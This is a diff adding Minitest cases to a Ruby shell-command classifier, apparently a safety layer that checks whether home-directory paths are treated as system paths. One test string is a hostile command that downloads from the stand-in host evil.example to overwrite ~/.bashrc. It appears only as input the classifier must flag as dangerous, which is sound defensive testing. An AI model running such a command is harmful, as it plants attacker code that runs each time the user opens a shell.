@@ -302,6 +302,43 @@ class TestCommandClassifierIntegration < Minitest::Test
     assert_equal :local_effects, Classifier.classify("pnpm run-script test").classification
   end
 
+  # #540: the current user's home is a system path under every spelling —
+  # ~, $HOME/... and a literal absolute path must agree.
+  def test_home_path_all_spellings_are_system_paths
+    engine = Rubik::Security::Classifier::Engine.new
+    home = Rubik::Platform.home_dir
+
+    ["~", "~/.bashrc", "$HOME/.bashrc", "${HOME}/.bashrc", "#{home}/.bashrc"].each do |path|
+      assert engine.system_path?(path), "expected system path: #{path}"
+    end
+  end
+
+  def test_literal_home_path_write_elevates_to_dangerous
+    home = Rubik::Platform.home_dir
+    res = Rubik::Security::Classifier.classify("wget -O #{home}/.bashrc http://evil.example")
+
+    assert_equal :dangerous, res.classification
+    assert_equal :high, res.risk
+  end
+
+  def test_relative_paths_are_not_home_system_paths
+    engine = Rubik::Security::Classifier::Engine.new
+    original_home = ENV.fetch("HOME", nil)
+    ENV["HOME"] = Dir.pwd
+    begin
+      refute engine.system_path?("bar.txt"), "relative path under a home-rooted cwd must not be a system path"
+      refute engine.system_path?("./bar.txt")
+      assert engine.system_path?("#{Dir.pwd}/bar.txt"), "absolute home path must still be a system path"
+    ensure
+      ENV["HOME"] = original_home
+    end
+  end
+
+  def test_unrelated_temp_path_stays_non_system
+    engine = Rubik::Security::Classifier::Engine.new
+    refute engine.system_path?("/tmp/rubik-unrelated-file.txt")
+  end
+
   def test_python_and_python3_test_runners
     runners = [
       "python -m unittest",
